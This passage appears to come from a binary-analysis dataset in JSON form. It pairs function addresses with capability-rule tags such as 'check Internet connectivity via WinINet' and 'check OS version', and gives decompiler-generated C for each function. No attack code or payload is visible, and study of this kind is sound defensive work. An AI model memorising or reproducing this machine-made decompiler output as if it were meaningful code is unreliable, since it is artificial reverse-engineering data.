        "decompiled_code": "\nvoid __cdecl fcn.00067540(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (*(arg_8h + 8) == 0) {\n        fcn.00076be0(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, 0);\n    }\n    else {\n        fcn.00076be0(*(arg_8h + 8), arg_ch, arg_10h, arg_14h, 0);\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "00067690": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00067690(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint8_t **arg_14h, int32_t *arg_18h, int32_t arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint *var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint8_t *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    var_10h = NULL;\n    if (*(arg_8h + 0xc) == 0) {\n        if (*(arg_8h + 0x10) == 0) {\n            if (*(arg_8h + 8) == 0) {\n                var_ch = *(arg_8h + 0x2c);\n                var_8h = 0;\n                var_18h = fcn.00075eb0(arg_8h + 8, &var_ch, 0, 0, *(arg_8h + 0x20), *(arg_8h + 0x24), \n                                       -((*(arg_8h + 0x28) & 1) != 0) & 2);\n                if (var_18h != 0) {\n                    return var_18h;\n                }\n            }\n            if ((arg_1ch != 0) && (arg_20h == 0)) {\n                return 0x21590002;\n            }\n            var_18h = fcn.00076560(*(arg_8h + 8), 0);\n            if (var_18h != 0) {\n                fcn.000761d0(arg_8h + 8, 0);\n                return var_18h;\n            }\n            *(arg_8h + 0x10) = 1;\n        }\n    }\n    else if (*(arg_8h + 8) == 0) {\n        if ((arg_1ch != 0) && (arg_20h == 0)) {\n            return 0x21590002;\n        }\n        fcn.00034a10(arg_8h + 0x1c);\n        if (*(arg_8h + 8) == 0) {\n            var_18h = fcn.000762e0(*(arg_8h + 4), arg_8h + 8, 0);\n        }\n        else {\n            var_18h = 0;\n        }\n        fcn.00034a80(arg_8h + 0x1c);\n        if (var_18h != 0) {\n            return var_18h;\n        }\n    }\n    var_18h = 0x21590064;\n    if (arg_ch != 0) {\n        var_2ch = 0;\n        var_1ch = 0;\n        var_2h._0_1_ = 0x90;\n        var_34h = &var_2h;\n        var_30h = 1;\n        var_38h = &var_28h;\n        var_24h = arg_10h;\n        var_20h = 0x90;\n        var_28h = arg_ch;\n        var_18h = fcn.00076cb0(*(arg_8h + 8), &var_38h, 0);\n        if (var_18h != 0) goto code_r0x00067964;\n    }\n    if (arg_1ch != 0) {\n        var_18h = fcn.00076860(*(arg_8h + 8), &var_10h, &var_14h, arg_20h, 0);\n        if (var_18h == 0) {\n            if (var_14h < 1) {\n                var_18h = 0x2159000a;\n            }\n            else {\n                var_2h._0_1_ = *var_10h;\n                if (var_14h < var_2h + 1) {\n                    var_18h = 0x2159000a;\n                }\n                else {\n                    *arg_14h = var_10h + var_2h + 1;\n                    *arg_18h = var_14h - (var_2h + 1);\n                    var_2h._1_1_ = var_2h;\n                    if (0x90 < var_2h) {\n                        var_2h._1_1_ = 0x90;\n                    }\n                    fcn.00078be8(arg_1ch, var_10h + 1, var_2h._1_1_);\n                    fcn.00078bfa(var_2h._1_1_ + arg_1ch, 0, 0x90 - var_2h._1_1_);\n                    if (*arg_18h == 0) {\n                        *arg_14h = NULL;\n                    }\n                    else {\n                        var_10h[var_2h] = var_2h;\n                        var_10h = NULL;\n                    }\n                }\n            }\n        }\n        else if ((var_18h != 0x21590002) && (fcn.000761d0(arg_8h + 8, 0),  *(arg_8h + 0xc) == 0)) {\n            *(arg_8h + 0x10) = 0;\n        }\n    }\ncode_r0x00067964:\n    if (var_18h != 0) {\n        fcn.00076a80(*(arg_8h + 8), var_10h);\n        fcn.000761d0(arg_8h + 8, 0);\n        if (*(arg_8h + 0xc) == 0) {\n            *(arg_8h + 0x10) = 0;\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 1399
    },
    "000679b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.000679b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint var_8h;\n    uint var_1h;\n    \n    arg_ch_00 = (arg_ch + -1) - *(arg_ch + -1);\n    if (*(arg_8h + 8) == 0) {\n        fcn.00076a80(*(arg_8h + 4), arg_ch_00);\n    }\n    else {\n        fcn.00076a80(*(arg_8h + 8), arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "00067a10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00067a10(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00067ae0(arg_8h, 0x138, arg_ch, arg_10h, arg_14h, 0, 0, arg_18h);\n    if ((iVar1 == 0) && (iVar1 = fcn.00068510(*arg_8h, 1),  iVar1 != 0)) {\n        fcn.00067d10(*arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 162
    },
    "00067a70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00067a70(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00067ae0(arg_8h, 0x144, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    if (iVar1 == 0) {\n        *(*arg_8h + 4) = 1;\n        iVar1 = fcn.00068510(*arg_8h, 1);\n        if (iVar1 != 0) {\n            fcn.00067d10(*arg_8h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 198
    },
    "00067ae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00067ae0(int32_t *arg_8h, uint arg_ch, char *arg_10h, int32_t arg_14h, uint noname_4, int32_t arg_1ch, uint noname_6\n            , uint32_t arg_24h)\n\n{\n    int16_t iVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint var_18h;\n    int16_t *var_14h;\n    int16_t *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.000356f0(arg_ch);\n    if (arg_8h_00 == 0) {\n        var_ch = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(arg_8h_00, 0, arg_ch);\n        *(arg_8h_00 + 0x11c) = 0xffff;\n        if ((arg_10h == NULL) || (*arg_10h == '\\0')) {\n            var_10h = 0x80055878;\n            var_14h = arg_8h_00 + 0x12;\n            do {\n                iVar1 = *var_10h;\n                *var_14h = iVar1;\n                var_10h = var_10h + 1;\n                var_14h = var_14h + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            iVar2 = fcn.000789c6(arg_8h_00 + 0x12, 0x40, 0x8005467c, arg_10h);\n            if (iVar2 < 0) {\n                *(arg_8h_00 + 0x90) = 0;\n            }\n        }\n        if (arg_14h == 0) {\n            fcn.000784d0(arg_8h_00 + 0xd8, arg_8h_00 + 0x118);\n        }\n        else {\n            var_ch = fcn.00078390(arg_14h, (arg_24h & 1) != 0, arg_8h_00 + 0xd8, arg_8h_00 + 0x118);\n            if (var_ch != 0) goto code_r0x00067c95;\n        }\n        iVar2 = fcn.00078810(arg_8h_00 + 0x12, arg_8h_00 + 0xd8, *(arg_8h_00 + 0x118), arg_8h_00 + 8, arg_8h_00 + 0xc);\n        if (iVar2 == 0) {\n            if ((arg_1ch == 0) ||\n               (var_ch = fcn.00078390(arg_1ch, (arg_24h & 2) != 0, arg_8h_00 + 0x92, arg_8h_00 + 0xd4),  var_ch == 0)) {\n                fcn.00073a20(arg_8h_00 + 0x120);\n                var_ch = 0;\n                *arg_8h = arg_8h_00;\n            }\n        }\n        else {\n            var_ch = fcn.00078a2c(iVar2);\n        }\n    }\ncode_r0x00067c95:\n    if ((var_ch != 0) && (arg_8h_00 != 0)) {\n        if (*(arg_8h_00 + 8) != 0) {\n            fcn.000789b4(*(arg_8h_00 + 8));\n        }\n        fcn.000357f0(arg_8h_00);\n    }\n    return var_ch;\n}\n",
        "token_count": 860
    },
    "00067cd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067cd0(int32_t arg_8h)\n\n{\n    fcn.00068510(arg_8h, 0);\n    *(arg_8h + 0x10) = 1;\n    while (0 < *(arg_8h + 0x134)) {\n        fcn.00034570(arg_8h + 300);\n        fcn.00043cb0(0);\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00067d10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067d10(int32_t arg_8h)\n\n{\n    if (*(arg_8h + 8) != 0) {\n        fcn.000789b4(*(arg_8h + 8));\n    }\n    fcn.00073a60(arg_8h + 0x120, 1);\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 93
    },
    "00067d50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00067d50(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_88h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\n    do {\n        do {\n            while( true ) {\n                iVar1 = fcn.00078140(&var_4h, &var_88h, 0x80, &var_8h);\n                if (iVar1 == 0) {\n                    return 0;\n                }\n                iVar1 = fcn.00078a92(&var_88h, 0x80055854);\n                if ((iVar1 != 0) || (*(arg_8h + 4) == '\\0')) break;\n                uVar2 = fcn.00037a10(var_8h, arg_8h + 0x138);\n                *(arg_8h + 0x140) = uVar2;\n            }\n            iVar1 = fcn.00078a92(&var_88h, 0x80055890);\n        } while (iVar1 != 0);\n        uVar2 = fcn.00036370(var_8h, 0, 0);\n        *(arg_8h + 0x11c) = uVar2;\n    } while (*(arg_8h + 0x11c) != 0);\n    return 0x21590066;\n}\n",
        "token_count": 328
    },
    "00067ed0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00067ed0(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(arg_8h + 0x140) == 0) || ((arg_10h & 0x10000) != 0)) {\n        var_4h = fcn.00067f60(arg_8h, arg_ch);\n    }\n    else {\n        var_14h = 0;\n        var_10h = 0;\n        var_ch = 0;\n        var_8h = 0;\n        if (*(arg_8h + 0x140) != 0) {\n            fcn.00037a70(arg_8h + 0x138, &var_14h);\n        }\n        var_14h = arg_ch;\n        var_4h = fcn.00067f60(arg_8h, &var_14h);\n        fcn.000357f0(var_10h);\n    }\n    return var_4h;\n}\n",
        "token_count": 262
    },
    "00067fc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000681e7)\n// WARNING: Removing unreachable block (ram,0x000681dc)\n// WARNING: Removing unreachable block (ram,0x000681fe)\n// WARNING: Removing unreachable block (ram,0x00068143)\n// WARNING: Removing unreachable block (ram,0x00068173)\n// WARNING: Removing unreachable block (ram,0x0006817a)\n// WARNING: Removing unreachable block (ram,0x00068183)\n// WARNING: Removing unreachable block (ram,0x00068196)\n// WARNING: Removing unreachable block (ram,0x0006819f)\n// WARNING: Removing unreachable block (ram,0x000681af)\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00067fc0(int32_t param_1, uint *param_2, int32_t param_3)\n\n{\n    uint arg_ch;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    int32_t var_8h;\n    uint *var_ch;\n    int32_t var_10h;\n    uint var_18h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint *var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    ushort var_58h;\n    uint var_56h;\n    uint var_52h;\n    uint var_4eh;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *puStack28;\n    uint var_10h_2;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8c18;\n    uStack16 = 0x800b8bf4;\n    var_10h_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h_2;\n    puStack28 = &stack0xffffff70;\n    arg_ch = *(*(var_8h + 0xc) + 4);\n    var_48h = (**0x80051234)(3, arg_ch, 0, 0, 0, 0, 1, 0, 0);\n    if (var_48h == 0) {\n        var_64h = 0x21590004;\n    }\n    else {\n        var_28h = 0;\n        for (var_68h = var_ch; var_68h != NULL; var_68h = *var_68h) {\n            if (var_68h[2] != 0) {\n                var_44h = (**0x8005128c)(var_68h[1], var_68h[2], var_68h != var_ch, 0, var_48h);\n                if (var_44h == 0) {\n                    (**0x800512e8)();\n                    var_64h = 0x21590004;\n                    goto code_r0x00068297;\n                }\n                var_4h = 0;\n                (**0x80051298)(var_44h, 0, 0);\n                var_4h = 0xffffffff;\n                var_28h = var_28h + var_68h[2];\n            }\n        }\n        var_60h = 1;\n        var_5ch._0_2_ = 0xe;\n        var_5ch._2_2_ = 2;\n        var_56h = *(var_10h + 4);\n        var_58h = *(var_10h + 2);\n        var_52h = 0;\n        var_4eh = 0;\n        var_40h = 0;\n        var_3ch = 0;\n        var_38h = 0;\n        var_34h = 0;\n        var_2ch = &var_60h;\n        var_30h = 0x16;\n        iVar1 = *(var_48h + 0x60);\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0x21) = 0;\n        iVar1 = *(var_48h + 0x60);\n        *(iVar1 + -0x24) = 0xf;\n        *(iVar1 + -0x23) = 9;\n        *(iVar1 + -0x10) = arg_ch;\n        *(iVar1 + -0xc) = *(var_8h + 0xc);\n        *(iVar1 + -0x20) = var_28h;\n        *(iVar1 + -0x1c) = &var_40h;\n        *(var_48h + 4) = *(var_48h + 4);\n        var_24h = fcn.000785d0(var_48h, arg_ch, &var_20h, 0xffffffff);\n        var_64h = fcn.00078a2c(var_24h);\n        if (var_24h == -0x3ffffdfa) {\n            var_64h = 0x2159000b;\n        }\n    }\ncode_r0x00068297:\n    *in_FS_OFFSET = var_10h_2;\n    return var_64h;\n}\n",
        "token_count": 1268
    },
    "000682b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.000682b0(int32_t arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    do {\n        if (*(arg_8h + 0x10) != '\\0') {\n            return 0x21590006;\n        }\n        iVar1 = fcn.00073be0(&var_ch, &var_8h, arg_8h + 0x120, arg_14h);\n        if (iVar1 == 0) {\n            *arg_ch = var_ch;\n            *arg_10h = var_8h;\n            return 0;\n        }\n        fcn.00037400(arg_8h + 0x134);\n        var_4h = fcn.000345a0(arg_8h + 300, arg_18h);\n        var_ch = arg_8h + 0x134;\n        fcn.00037420(var_ch);\n        if (var_4h == 0) {\n            return 0x21590002;\n        }\n    } while (var_4h != -1);\n    return 0xffffffff;\n}\n",
        "token_count": 305
    },
    "000683a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000683a0(int32_t arg_8h, int32_t arg_ch, char **arg_10h, char *arg_14h)\n\n{\n    char cVar1;\n    ushort uVar2;\n    uint uVar3;\n    uint32_t in_EDX;\n    uint var_48h;\n    char **var_44h;\n    uint *var_40h;\n    uint var_3ch;\n    uint var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    \n    if ((arg_ch == 4) || (arg_ch == 3)) {\n        uVar2 = fcn.00035980(in_EDX & 0xffff0000 | *(arg_8h + 0x9a));\n        fcn.00078ad4(&var_18h, 0x80055868, *(arg_8h + 0x9c), *(arg_8h + 0x9d), *(arg_8h + 0x9e), *(arg_8h + 0x9f), uVar2\n                    );\n        if (arg_ch == 3) {\n            if (arg_14h != 0x4) {\n                return 0x21590064;\n            }\n            var_20h = &var_18h;\n            do {\n                cVar1 = *var_20h;\n                var_20h = var_20h + 1;\n            } while (cVar1 != '\\0');\n            *arg_10h = var_20h + (1 - (&var_18h + 1));\n        }\n        else {\n            if (arg_14h < 1) {\n                return 0x21590064;\n            }\n            var_30h = &var_18h;\n            do {\n                cVar1 = *var_30h;\n                var_30h = var_30h + 1;\n            } while (cVar1 != '\\0');\n            if (arg_14h < var_30h + (1 - (&var_18h + 1))) {\n                fcn.00078ac8(arg_10h, &var_18h, arg_14h + -1);\n                *(arg_10h + arg_14h + -1) = '\\0';\n            }\n            else {\n                var_40h = &var_18h;\n                var_44h = arg_10h;\n                do {\n                    cVar1 = *var_40h;\n                    *var_44h = cVar1;\n                    var_40h = var_40h + 1;\n                    var_44h = var_44h + 1;\n                } while (cVar1 != '\\0');\n            }\n        }\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = 0x21590001;\n    }\n    return uVar3;\n}\n",
        "token_count": 665
    },
    "00068510": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000685fd)\n// WARNING: Removing unreachable block (ram,0x000685f2)\n// WARNING: Removing unreachable block (ram,0x00068614)\n// WARNING: Removing unreachable block (ram,0x00068559)\n// WARNING: Removing unreachable block (ram,0x00068589)\n// WARNING: Removing unreachable block (ram,0x00068590)\n// WARNING: Removing unreachable block (ram,0x00068599)\n// WARNING: Removing unreachable block (ram,0x000685ac)\n// WARNING: Removing unreachable block (ram,0x000685b5)\n// WARNING: Removing unreachable block (ram,0x000685c5)\n\nuint __cdecl fcn.00068510(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint uVar2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    uVar2 = *(*(arg_8h + 0xc) + 4);\n    arg_8h_00 = (**0x80051234)(3, *(*(arg_8h + 0xc) + 4), 0, 0, 0, 0, 1, 0, 0);\n    if (arg_8h_00 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        iVar1 = *(arg_8h_00 + 0x60);\n        *(iVar1 + -8) = 0;\n        *(iVar1 + -4) = 0;\n        *(iVar1 + -0x21) = 0;\n        iVar1 = *(arg_8h_00 + 0x60);\n        *(iVar1 + -0x24) = 0xf;\n        *(iVar1 + -0x23) = 0xb;\n        *(iVar1 + -0x10) = uVar2;\n        *(iVar1 + -0xc) = *(arg_8h + 0xc);\n        *(iVar1 + -0x20) = 4;\n        *(iVar1 + -0x1c) = -(arg_ch != '\\0') & 0x800a86a0;\n        *(iVar1 + -0x18) = arg_8h;\n        uVar2 = fcn.000785d0(arg_8h_00, uVar2, &var_8h, 0xffffffff);\n    }\n    return uVar2;\n}\n",
        "token_count": 590
    },
    "000686a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00068a09)\n// WARNING: Removing unreachable block (ram,0x000689d3)\n// WARNING: Removing unreachable block (ram,0x000689fe)\n// WARNING: Removing unreachable block (ram,0x00068a05)\n// WARNING: Removing unreachable block (ram,0x00068a1c)\n// WARNING: Removing unreachable block (ram,0x00068a20)\n\nint32_t __cdecl\nfcn.000686a0(uint32_t arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint noname_3, uint noname_4, uint32_t arg_1ch, \n            uint arg_20h, int32_t arg_24h, uint *arg_28h, uint arg_2ch, int32_t *arg_30h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t *var_44h;\n    int32_t *var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_20h = 0;\n    var_1ch = NULL;\n    uVar4 = *(arg_8h + 0x128) + arg_24h;\n    if (*(arg_8h + 0x11c) <= uVar4 && uVar4 != *(arg_8h + 0x11c)) {\n        return -0x3ffffde5;\n    }\n    fcn.00078460(arg_10h, &var_10h);\n    if (*(arg_8h + 4) == '\\0') goto code_r0x000687f4;\n    var_40h = arg_8h + 0x92;\n    var_44h = arg_10h;\n    for (var_3ch = arg_ch; 3 < var_3ch; var_3ch = var_3ch - 4) {\n        if (*var_44h != *var_40h) goto code_r0x0006873f;\n        var_40h = var_40h + 1;\n        var_44h = var_44h + 1;\n    }\n    if (var_3ch == 0) {\ncode_r0x000687c1:\n        var_4ch = 0;\n    }\n    else {\ncode_r0x0006873f:\n        var_48h = *var_44h - *var_40h;\n        if (var_48h == 0) {\n            if (var_3ch == 1) goto code_r0x000687c1;\n            var_48h = *(var_44h + 1) - *(var_40h + 1);\n            if (var_48h == 0) {\n                if (var_3ch == 2) goto code_r0x000687c1;\n                var_48h = *(var_44h + 2) - *(var_40h + 2);\n                if (var_48h == 0) {\n                    if ((var_3ch == 3) || (var_48h = *(var_44h + 3) - *(var_40h + 3),  var_48h == 0))\n                    goto code_r0x000687c1;\n                }\n            }\n        }\n        var_4ch = 1;\n        if (var_48h < 1) {\n            var_4ch = -1;\n        }\n    }\n    if (var_4ch != 0) {\n        return -0x3ffffde5;\n    }\ncode_r0x000687f4:\n    if ((arg_1ch & 0x400) == 0) {\n        var_14h = (**0x80051270)(arg_8h & 0xffffff00 | *(*(*(arg_8h + 0xc) + 4) + 0x30), 0);\n        if (var_14h == 0) {\n            var_28h = -0x3fffff66;\n        }\n        else {\n            var_1ch = fcn.000356f0(0x70);\n            if (var_1ch == NULL) {\n                var_28h = -0x3fffff66;\n            }\n            else {\n                uVar3 = fcn.000356f0(arg_24h);\n                var_1ch[5] = uVar3;\n                if (var_1ch[5] == 0) {\n                    var_28h = -0x3fffff66;\n                }\n                else {\n                    var_20h = (**0x8005128c)(var_1ch[5], arg_24h, 0, 0, var_14h);\n                    if (var_20h == 0) {\n                        var_28h = -0x3fffff66;\n                    }\n                    else {\n                        (**0x80051268)(var_20h);\n                        var_1ch[4] = arg_8h;\n                        *var_1ch = var_10h;\n                        var_1ch[1] = var_ch;\n                        var_1ch[2] = var_8h;\n                        var_1ch[3] = var_4h;\n                        var_1ch[6] = 0;\n                        var_1ch[7] = 0;\n                        var_1ch[8] = 0;\n                        var_1ch[9] = 0;\n                        var_1ch[10] = 0;\n                        var_1ch[0xb] = 0;\n                        var_1ch[0xb] = var_1ch + 0xc;\n                        var_1ch[10] = 0x40;\n                        iVar1 = *(var_14h + 0x60);\n                        *(iVar1 + -8) = 0x800a8b50;\n                        *(iVar1 + -4) = var_1ch;\n                        *(iVar1 + -0x21) = 0;\n                        *(iVar1 + -0x21) = 0x40;\n                        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x80;\n                        *(iVar1 + -0x21) = *(iVar1 + -0x21) | 0x20;\n                        iVar1 = *(var_14h + 0x60);\n                        *(iVar1 + -0x24) = 0xf;\n                        *(iVar1 + -0x23) = 10;\n                        *(iVar1 + -0x10) = *(*(arg_8h + 0xc) + 4);\n                        *(iVar1 + -0xc) = *(arg_8h + 0xc);\n                        *(iVar1 + -0x20) = arg_24h;\n                        *(iVar1 + -0x1c) = 0;\n                        *(iVar1 + -0x18) = var_1ch + 6;\n                        *(iVar1 + -0x14) = 0x20;\n                        *(var_14h + 4) = var_20h;\n                        *(var_14h + 0x23) = *(var_14h + 0x23) + -1;\n                        *(var_14h + 0x60) = *(var_14h + 0x60) + -0x24;\n                        *arg_30h = var_14h;\n                        *arg_28h = 0;\n                        var_28h = -0x3fffffea;\n                        var_14h = 0;\n                        var_20h = 0;\n                        var_1ch = NULL;\n                    }\n                }\n            }\n        }\n        if (var_1ch != NULL) {\n            fcn.000357f0(var_1ch[5]);\n            fcn.000357f0(var_1ch);\n        }\n        if (var_20h != 0) {\n            (**0x800512a4)(var_20h);\n        }\n        if (var_14h != 0) {\n            (**0x8005126c)(var_14h);\n        }\n        if (var_28h != -0x3fffffea) {\n            var_28h = -0x3ffffde5;\n        }\n    }\n    else {\n        iVar1 = fcn.000356f0(arg_20h);\n        if (iVar1 != 0) {\n            fcn.00078be8(iVar1, arg_2ch, arg_20h);\n            iVar2 = fcn.00073af0(iVar1, arg_20h, arg_8h + 0x120, &var_10h);\n            if (iVar2 == 0) {\n                *arg_28h = arg_20h;\n                return 0;\n            }\n            fcn.000357f0(iVar1);\n        }\n        var_28h = -0x3ffffde5;\n    }\n    return var_28h;\n}\n",
        "token_count": 2115
    },
    "00068b50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
